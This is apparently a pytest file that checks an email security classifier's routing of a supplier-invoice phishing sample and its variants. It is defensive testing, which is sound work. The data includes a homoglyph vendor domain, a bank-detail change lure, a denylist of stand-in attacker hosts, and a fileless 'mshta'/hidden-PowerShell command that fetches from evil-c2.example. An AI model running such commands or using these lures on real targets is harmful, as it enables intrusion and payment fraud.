import pytest


def _patch_thresholds(monkeypatch):
    thresholds = {
        "SECURITY_THRESHOLDS": {
            "BEC_WARN_INDICATORS": 2,
            "BEC_ERROR_INDICATORS": 3,
            "IOC_WARN_COUNT": 1,
            "IOC_ERROR_COUNT": 2,
            "DOMAIN_DENYLIST": ["evil-payments.example", "evil-c2.example", "dropbox-bad.example"],
            "TRUSTED_VENDOR_DOMAINS": ["ingramfake.com.au", "supplier.com"],
            "INTERNAL_EMAIL_DOMAINS": ["shopsquire.ai"],
        },
        "TICKET_RATE_LIMIT": {"enabled": False, "per_min": 200},
    }

    import src.app.security.email_security as es
    import src.app.security.email_security_rules as rules
    import src.app.security.email_security_verdict as verdict

    monkeypatch.setattr(es, "load_feature_flags", lambda *_args, **_kwargs: thresholds)
    monkeypatch.setattr(rules, "load_feature_flags", lambda *_args, **_kwargs: thresholds)
    monkeypatch.setattr(verdict, "load_feature_flags", lambda *_args, **_kwargs: thresholds)


def _base_supplier_email():
    cyra = "\u0430"
    homo_domain = f"ingramf{cyra}ke.com.au"
    return {
        "message_id": "<inv-2026-00847@supplier>",
        "from_addr": f"George McDufus <accounts@{homo_domain}>",
        "reply_to": f"accounts@{homo_domain}",
        "subject": "[Accounts] New laptop stock | Ingram Fake",
        "body": (
            "We currently have restock on Lenovo and Apple Macbook laptops. "
            "We are changing payment procedures. Please note our banking details have recently changed. "
            "Disregard any previous remittance instructions."
        ),
        "attachments": [{"name": "INV-2026-00847.pdf"}],
        "external_sender": True,
        "vendor_domain": "ingramfake.com.au",
        "bank_fingerprint": "bank-old",
        "proposed_bank_fingerprint": "bank-new",
        "reply_chain_id": "thread-2",
        "prior_reply_chain_id": "thread-1",
        "oob_verified": False,
        "spf_result": "pass",
        "dkim_result": "pass",
        "dmarc_result": "pass",
        "dmarc_policy": "reject",
        "dmarc_fail": False,
    }


@pytest.mark.parametrize(
    "name,mutator,expected_route,expected_indicator",
    [
        ("exact_sample_homoglyph_bank_change", lambda e: e, "security_review", "vendor_homoglyph_impersonation"),
        ("auth_fail_variant", lambda e: e.update({"spf_result": "fail", "dkim_result": "fail", "dmarc_result": "fail", "dmarc_fail": True}) or e, "security_review", "auth_enforcement"),
        ("reply_to_mismatch_variant", lambda e: e.update({"reply_to": "accounts@evil-payments.example"}) or e, "security_review", "reply_to_mismatch"),
        ("shortener_redirect_variant", lambda e: e.update({"body": e["body"] + " Pay at https://bit.ly/paynow?redirect=https://evil-c2.example/login"}) or e, "security_review", "url_detonation_high_risk"),
        ("macro_attachment_variant", lambda e: e.update({"attachments": [{"name": "Invoice_Enable_Content.xlsm"}]}) or e, "security_review", "attachment_static_triage_high_risk"),
        ("lolbin_fileless_variant", lambda e: e.update({"body": e["body"] + " run mshta https://evil-c2.example/a and powershell -w hidden -enc AAA"}) or e, "security_review", "fileless_execution_pattern"),
        ("exfil_keylogger_variant", lambda e: e.update({"body": e["body"] + " This keylogger captures credentials then export all customers to dropbox-bad.example"}) or e, "security_review", "data_exfil_intent"),
        ("oob_verified_bank_change_variant", lambda e: e.update({"from_addr": "Accounts <accounts@ingramfake.com.au>", "reply_to": "accounts@ingramfake.com.au", "oob_verified": True}) or e, "human_review", "oob_verification_completed"),
        ("benign_stock_update_control", lambda e: {**e, "from_addr": "Ops <ops@ingramfake.com.au>", "reply_to": "ops@ingramfake.com.au", "subject": "Weekly stock ETA update", "body": "Lenovo X1 allocation arrives next Tuesday. No payment or remittance changes.", "attachments": [], "bank_fingerprint": None, "proposed_bank_fingerprint": None, "oob_verified": False}, "human_review", None),
    ],
)
def test_supplier_phish_sample_and_permutations(monkeypatch, name, mutator, expected_route, expected_indicator):
    _patch_thresholds(monkeypatch)
    from src.app.security.email_security import evaluate_email_security

    email = _base_supplier_email()
    mutated = mutator(email)
    if isinstance(mutated, dict):
        email = mutated

    out = evaluate_email_security(email, tenant_id="tenant-redteam")
    assert out.get("route") == expected_route, f"{name}: unexpected route={out.get('route')} reasons={out.get('reasons')}"
    types = {str(i.get("type")) for i in (out.get("indicators") or [])}
    if expected_indicator:
        assert expected_indicator in types, f"{name}: missing indicator {expected_indicator}; types={sorted(types)}"


def test_extract_domain_handles_unicode_homoglyph():
    from src.app.security.email_security_rules import extract_domain

    cyra = "\u0430"
    got = extract_domain(f"accounts@ingramf{cyra}ke.com.au")
    assert got and "com.au" in got
    assert got != "ingramf"

